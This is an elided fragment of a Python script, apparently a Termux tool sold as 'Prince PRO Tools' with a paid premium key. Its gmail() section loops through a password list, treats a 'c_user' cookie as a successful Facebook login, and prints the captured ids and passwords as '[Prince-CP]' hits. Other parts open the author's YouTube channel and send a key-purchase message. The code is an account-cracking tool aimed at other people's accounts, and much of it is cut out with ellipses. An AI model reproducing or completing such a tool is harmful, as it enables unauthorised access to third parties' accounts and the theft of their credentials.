...
os.system('xdg-open https://youtube.com/@ROSIDHRIDOY6210/')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://youtube.com/@ROSIDHRIDOY6210');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://youtube.com/@ROSIDHRIDOY6210/?app=fbl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://youtube.com/@ROSIDHRIDOY6210="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Prince Sir, I Need To Buy Your Paid Prince PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python Prince.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def gmail():
                ...
                linex()
                print('\033[1;37m example: ROSID,HRIDOY \033[1;97m')
                linex()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Prince:
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [Prince-CP] '+ids+' | '+pas+'\033[1;97m')
